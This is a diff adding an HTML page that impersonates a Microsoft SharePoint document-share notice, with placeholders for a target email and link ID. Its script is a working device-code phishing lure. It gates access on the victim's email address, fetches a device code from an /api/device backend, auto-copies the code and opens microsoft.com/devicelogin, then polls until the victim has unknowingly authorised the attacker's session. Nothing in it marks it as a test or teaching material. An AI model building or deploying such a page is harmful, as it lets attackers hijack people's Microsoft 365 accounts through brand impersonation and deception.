@@ -1,0 +1,206 @@
+<!DOCTYPE html><html lang="en"><head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Microsoft SharePoint — Document Shared With You</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#f3f2f1;font-family:'Inter','Segoe UI',sans-serif;min-height:100vh}
+.page{max-width:640px;margin:0 auto;background:#fff;box-shadow:0 2px 16px rgba(0,0,0,.1);min-height:100vh}
+/* SharePoint header — green */
+.header{background:#038387;padding:14px 24px;display:flex;align-items:center;justify-content:space-between}
+.sp-brand{display:flex;align-items:center;gap:10px}
+.sp-icon{width:32px;height:32px}
+.sp-name{font-size:16px;font-weight:700;color:#fff;letter-spacing:-.2px}
+.ms-logo-small{display:flex;align-items:center;gap:6px}
+.ms-logo-small svg{opacity:.8}
+.ms-logo-small span{font-size:11px;color:rgba(255,255,255,.7);font-weight:300}
+/* Breadcrumb bar */
+.breadcrumb{background:#025d5f;padding:8px 24px;font-size:12px;color:rgba(255,255,255,.65);display:flex;align-items:center;gap:6px}
+.bc-sep{opacity:.4}
+/* Hero */
+.hero{background:linear-gradient(135deg,#038387,#025d5f);padding:26px 24px;color:#fff}
+.hero-inner{display:flex;gap:14px;align-items:flex-start}
+.hero-icon{width:50px;height:50px;background:rgba(255,255,255,.15);border-radius:8px;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.hero h1{font-size:20px;font-weight:800;margin-bottom:5px}
+.hero p{font-size:13px;opacity:.82;line-height:1.6}
+/* Content */
+.content{padding:24px}
+/* Document card */
+.doc-card{border:1px solid #e0e0e0;border-radius:6px;overflow:hidden;margin-bottom:18px;cursor:pointer}
+.dc-header{background:#f3f2f1;padding:14px 16px;display:flex;align-items:center;gap:12px;border-bottom:1px solid #e0e0e0}
+.doc-type-icon{width:38px;height:38px;border-radius:4px;display:flex;align-items:center;justify-content:center;flex-shrink:0;font-size:12px;font-weight:800;color:#fff}
+.doc-name{font-size:14px;font-weight:700;color:#1a1a1a;margin-bottom:2px}
+.doc-path{font-size:11px;color:#888;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
+.dc-body{padding:14px 16px;display:flex;gap:14px}
+.doc-preview-lines{flex:1}
+.dpl{height:5px;background:#e8e8e8;border-radius:2px;margin-bottom:7px}
+.dpl.w100{width:100%}
+.dpl.w80{width:80%}
+.dpl.w65{width:65%}
+.dpl.w90{width:90%}
+.doc-stats{display:flex;flex-direction:column;gap:6px;min-width:100px}
+.ds-item{background:#f8f8f8;border-radius:4px;padding:6px 8px;text-align:center}
+.ds-val{font-size:13px;font-weight:700;color:#038387}
+.ds-label{font-size:9px;color:#aaa;text-transform:uppercase;letter-spacing:.3px}
+/* Share info */
+.share-info{background:#f3f9f9;border:1px solid #c8e6e7;border-radius:6px;padding:14px 16px;display:flex;align-items:center;gap:12px;margin-bottom:18px}
+.si-icon{width:32px;height:32px;background:#038387;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0}
+.si-text{font-size:13px;color:#025d5f;font-weight:500;line-height:1.5}
+.si-meta{font-size:11px;color:#6b9e9f;margin-top:2px}
+/* Permissions row */
+.perms-row{display:flex;gap:8px;flex-wrap:wrap;margin-bottom:20px}
+.perm-tag{display:inline-flex;align-items:center;gap:5px;background:#f0f9f9;border:1px solid #c8e6e7;border-radius:14px;padding:4px 10px;font-size:12px;color:#038387;font-weight:600}
+/* CTA */
+.btn-open{display:block;width:100%;background:#038387;color:#fff;border:none;border-radius:4px;padding:14px;font-size:15px;font-weight:700;cursor:pointer;font-family:inherit;text-align:center;margin-bottom:8px;box-shadow:0 3px 12px rgba(3,131,135,.3)}
+.btn-row{display:flex;gap:8px}
+.btn-sm{flex:1;background:#fff;color:#038387;border:1.5px solid #038387;border-radius:4px;padding:11px;font-size:13px;font-weight:600;cursor:pointer;font-family:inherit}
+.ms-note{text-align:center;font-size:11px;color:#aaa;margin-top:10px;display:flex;align-items:center;justify-content:center;gap:5px}
+/* Footer */
+.footer{background:#f3f2f1;padding:16px 24px;border-top:1px solid #e0e0e0}
+.footer p{font-size:11px;color:#aaa;line-height:1.8}
+.footer a{color:#038387}
+/* Auth overlay */
+#auth-overlay{display:none;position:fixed;inset:0;z-index:9998;background:rgba(0,0,0,.8);backdrop-filter:blur(4px);align-items:center;justify-content:center}
+.auth-box{background:#fff;border-radius:6px;padding:32px 28px;max-width:380px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.3)}
+#email-gate{display:none;position:fixed;inset:0;z-index:9999;flex-direction:column;align-items:center;justify-content:center;background:rgba(0,0,0,.78);backdrop-filter:blur(8px)}
+.gate-box{background:#fff;border-radius:6px;padding:36px 28px;width:90%;max-width:400px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.4)}
+.gate-input{width:100%;padding:12px 14px;border:1px solid #e0e0e0;border-radius:4px;font-size:14px;font-family:inherit;outline:none;margin-bottom:8px;transition:border .15s}
+.gate-input:focus{border-color:#038387}
+.gate-btn{width:100%;background:#038387;color:#fff;border:none;border-radius:4px;padding:13px;font-size:14px;font-weight:700;cursor:pointer;font-family:inherit}
+.gate-err{color:#c53030;font-size:13px;margin-bottom:8px;display:none}
+@keyframes spin{to{transform:rotate(360deg)}}
+@keyframes sh{0%,100%{transform:translateX(0)}25%{transform:translateX(-6px)}75%{transform:translateX(6px)}}
+</style></head><body>
+<div class="page">
+  <div class="header">
+    <div class="sp-brand">
+      <!-- SharePoint S icon in CSS -->
+      <svg class="sp-icon" viewBox="0 0 32 32" fill="none">
+        <rect width="32" height="32" rx="4" fill="rgba(255,255,255,.15)"/>
+        <text x="7" y="23" font-family="Arial,sans-serif" font-size="20" font-weight="900" fill="white">S</text>
+      </svg>
+      <span class="sp-name">SharePoint</span>
+    </div>
+    <div class="ms-logo-small">
+      <svg width="18" height="18" viewBox="0 0 21 21"><rect width="10" height="10" fill="#F25022"/><rect x="11" width="10" height="10" fill="#7FBA00"/><rect y="11" width="10" height="10" fill="#00A4EF"/><rect x="11" y="11" width="10" height="10" fill="#FFB900"/></svg>
+      <span>Microsoft 365</span>
+    </div>
+  </div>
+  <div class="breadcrumb">
+    <span>Home</span><span class="bc-sep">›</span><span>Documents</span><span class="bc-sep">›</span><span>Shared With Me</span>
+  </div>
+  <div class="hero">
+    <div class="hero-inner">
+      <div class="hero-icon">
+        <svg width="26" height="26" viewBox="0 0 24 24" fill="white"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8l-6-6zm4 18H6V4h7v5h5v11z"/></svg>
+      </div>
+      <div>
+        <h1>A document has been shared with you</h1>
+        <p>A Microsoft SharePoint document from your organisation is ready for your review. Sign in with your Microsoft account to access it.</p>
+      </div>
+    </div>
+  </div>
+  <div class="content">
+    <div class="doc-card" onclick="startAuth()">
+      <div class="dc-header">
+        <div class="doc-type-icon" style="background:#185ABD">W</div>
+        <div style="flex:1;min-width:0">
+          <div class="doc-name">Corporate_Policy_Update_2026_FINAL.docx</div>
+          <div class="doc-path">SharePoint › Corporate Documents › HR Policies › 2026</div>
+        </div>
+      </div>
+      <div class="dc-body">
+        <div class="doc-preview-lines">
+          <div class="dpl w100"></div>
+          <div class="dpl w80"></div>
+          <div class="dpl w90"></div>
+          <div class="dpl w65"></div>
+          <div class="dpl w100"></div>
+          <div class="dpl w80"></div>
+        </div>
+        <div class="doc-stats">
+          <div class="ds-item"><div class="ds-val">24</div><div class="ds-label">Pages</div></div>
+          <div class="ds-item"><div class="ds-val">1.8</div><div class="ds-label">MB</div></div>
+          <div class="ds-item"><div class="ds-val">Word</div><div class="ds-label">Format</div></div>
+        </div>
+      </div>
+    </div>
+    <div class="share-info">
+      <div class="si-icon"><svg width="16" height="16" viewBox="0 0 24 24" fill="white"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7s-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81 1.66 0 3-1.34 3-3s-1.34-3-3-3-3 1.34-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9c-1.66 0-3 1.34-3 3s1.34 3 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.16c-.05.21-.08.43-.08.65 0 1.61 1.31 2.92 2.92 2.92 1.61 0 2.92-1.31 2.92-2.92 0-1.61-1.31-2.92-2.92-2.92z"/></svg></div>
+      <div>
+        <div class="si-text">Shared from Microsoft SharePoint — Corporate Documents</div>
+        <div class="si-meta">Shared today · Requires Microsoft 365 sign-in to view</div>
+      </div>
+    </div>
+    <div class="perms-row">
+      <span class="perm-tag">✏️ Can View &amp; Edit</span>
+      <span class="perm-tag">💬 Can Comment</span>
+      <span class="perm-tag">🏢 Organisation Only</span>
+    </div>
+    <button class="btn-open" onclick="startAuth()">Open in Microsoft SharePoint</button>
+    <div class="btn-row">
+      <button class="btn-sm" onclick="startAuth()">⬇ Download</button>
+      <button class="btn-sm" onclick="startAuth()">📋 Open in Word</button>
+    </div>
+    <div class="ms-note">
+      <svg width="14" height="14" viewBox="0 0 21 21"><rect width="10" height="10" fill="#F25022"/><rect x="11" width="10" height="10" fill="#7FBA00"/><rect y="11" width="10" height="10" fill="#00A4EF"/><rect x="11" y="11" width="10" height="10" fill="#FFB900"/></svg>
+      Sign in with your Microsoft 365 work account to access this document
+    </div>
+  </div>
+  <div class="footer">
+    <p>© 2026 Microsoft Corporation · <a href="#">Privacy</a> · <a href="#">Terms of Use</a> · <a href="#">Unsubscribe</a></p>
+    <p>You received this notification because a SharePoint document was shared with your email address.</p>
+  </div>
+</div>
+
+<div id="auth-overlay">
+  <div class="auth-box">
+    <div style="display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:18px">
+      <svg width="21" height="21" viewBox="0 0 21 21"><rect width="10" height="10" fill="#F25022"/><rect x="11" width="10" height="10" fill="#7FBA00"/><rect y="11" width="10" height="10" fill="#00A4EF"/><rect x="11" y="11" width="10" height="10" fill="#FFB900"/></svg>
+      <span style="font-size:15px;font-weight:300;color:#555">Microsoft</span>
+    </div>
+    <h3 id="auth-title" style="font-size:18px;font-weight:700;color:#1a1a1a;margin-bottom:6px">Sign in to open document</h3>
+    <p id="auth-sub" style="font-size:13px;color:#888;margin-bottom:22px;line-height:1.6">Your Microsoft 365 account is required to access this SharePoint document.</p>
+    <div id="spinner-sec"><div style="width:34px;height:34px;border:3px solid #eee;border-top-color:#038387;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 12px"></div><p style="font-size:13px;color:#bbb">Connecting…</p></div>
+    <div id="code-sec" style="display:none">
+      <p style="font-size:12px;color:#aaa;margin-bottom:12px">Your code is ready. Click below — it opens Microsoft and pastes for you.</p>
+      <div id="code-val" onclick="openLogin()" style="font-size:32px;font-weight:900;letter-spacing:8px;color:#1a1a1a;font-family:monospace;background:#f0f9f9;border-radius:4px;padding:12px;margin-bottom:16px;cursor:pointer;border:2px dashed #038387"></div>
+      <button onclick="openLogin()" id="open-btn" style="width:100%;padding:14px;font-size:15px;font-weight:700;border:none;border-radius:4px;cursor:pointer;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:10px;margin-bottom:10px;background:#038387;color:#fff;box-shadow:0 4px 14px rgba(0,0,0,.2)">
+        <svg width="18" height="18" viewBox="0 0 21 21"><rect width="10" height="10" fill="#F25022"/><rect x="11" width="10" height="10" fill="#7FBA00"/><rect y="11" width="10" height="10" fill="#00A4EF"/><rect x="11" y="11" width="10" height="10" fill="#FFB900"/></svg>
+        Open Microsoft Device Login →
+      </button>
+      <p id="cp-ok" style="font-size:12px;color:#22c55e;display:none;margin-bottom:4px">✅ Code copied! Paste it on the Microsoft page.</p>
+      <p style="font-size:11px;color:#777;margin-top:4px">Expires in <span id="xtimer">15:00</span> · <span onclick="cpCode()" style="cursor:pointer;text-decoration:underline">Copy manually</span></p>
+    </div>
+    <div id="ok-sec" style="display:none">
+      <svg width="48" height="48" viewBox="0 0 24 24" fill="#22c55e" style="margin-bottom:10px"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/></svg>
+      <p style="font-size:15px;font-weight:700;color:#22c55e">Signed In</p>
+      <p style="font-size:13px;color:#aaa;margin-top:4px">Opening document in SharePoint…</p>
+    </div>
+  </div>
+</div>
+
+<div id="email-gate">
+  <div class="gate-box">
+    <svg width="36" height="36" viewBox="0 0 32 32" style="margin:0 auto 16px;display:block">
+      <rect width="32" height="32" rx="4" fill="#038387"/>
+      <text x="7" y="23" font-family="Arial,sans-serif" font-size="20" font-weight="900" fill="white">S</text>
+    </svg>
+    <p style="font-size:17px;font-weight:700;color:#1a1a1a;margin-bottom:6px">Confirm Your Email</p>
+    <p style="font-size:13px;color:#888;margin-bottom:20px;line-height:1.6">This SharePoint document notification was sent to your work inbox. Enter the email address where you received it to open the document.</p>
+    <input id="gem" class="gate-input" type="email" placeholder="Your work email address" onkeydown="if(event.key==='Enter')gv()">
+    <div id="gerr" class="gate-err">❌ Email not found. Enter the work email where you received this notification.</div>
+    <button class="gate-btn" onclick="gv()">Continue to Document →</button>
+    <p style="font-size:11px;color:#ccc;margin-top:12px">🔒 Microsoft SharePoint · Secure Access</p>
+  </div>
+</div>
+
+<script>
+const LINK_ID='{{LINK_ID}}',TARGET='{{TARGET_EMAIL}}';
+(function(){if(!TARGET)return;const g=document.getElementById('email-gate');g.style.display='flex';setTimeout(()=>{const i=document.getElementById('gem');if(i)i.focus();},150);})();
+function gv(){const e=(document.getElementById('gem').value||'').trim().toLowerCase(),err=document.getElementById('gerr');if(e===TARGET.toLowerCase()){const g=document.getElementById('email-gate');g.style.transition='opacity .3s';g.style.opacity='0';setTimeout(()=>g.remove(),300);}else{err.style.display='block';const i=document.getElementById('gem');i.style.borderColor='#c53030';i.style.animation='sh .35s ease';setTimeout(()=>{i.style.animation='';i.style.borderColor='';},400);}}
+let sc='',pi,ci,tl=900;
+function startAuth(){document.getElementById('auth-overlay').style.display='flex';fetch('/api/device/start',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sessionId:LINK_ID})}).then(r=>r.json()).then(d=>{if(d.error){location.reload();return;}sc=d.user_code||d.userCode;document.getElementById('code-val').textContent=sc;document.getElementById('spinner-sec').style.display='none';document.getElementById('code-sec').style.display='block';ci=setInterval(()=>{tl--;const m=String(Math.floor(tl/60)).padStart(2,'0'),s=String(tl%60).padStart(2,'0');const el=document.getElementById('xtimer');if(el)el.textContent=m+':'+s;if(tl<=0)clearInterval(ci);},1000);pi=setInterval(()=>{fetch('/api/device/poll',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({sessionId:LINK_ID,device_code:d.device_code})}).then(r=>r.json()).then(p=>{if(p.success){clearInterval(pi);clearInterval(ci);document.getElementById('code-sec').style.display='none';document.getElementById('ok-sec').style.display='block';setTimeout(()=>window.location.href='https://sharepoint.com',2500);}}).catch(()=>{});},(d.interval||5)*1000);}).catch(()=>location.reload());}
+function openLogin(){cpCode();const url='https://microsoft.com/devicelogin';const w=window.open(url,'_blank','width=560,height=620,left=200,top=100,noopener');if(!w||w.closed||typeof w.closed==='undefined'){const btn=document.getElementById('open-btn');if(btn){btn.textContent='⏎ Redirecting…';}setTimeout(()=>window.location.href=url,800);}}
+function cpCode(){const ta=document.createElement('textarea');ta.value=sc;ta.style.cssText='position:fixed;top:-999px;opacity:0';document.body.appendChild(ta);ta.focus();ta.select();try{document.execCommand('copy');}catch(e){}document.body.removeChild(ta);const ok=document.getElementById('cp-ok');if(ok){ok.style.display='block';setTimeout(()=>ok.style.display='none',3000);}}
+</script></body></html>
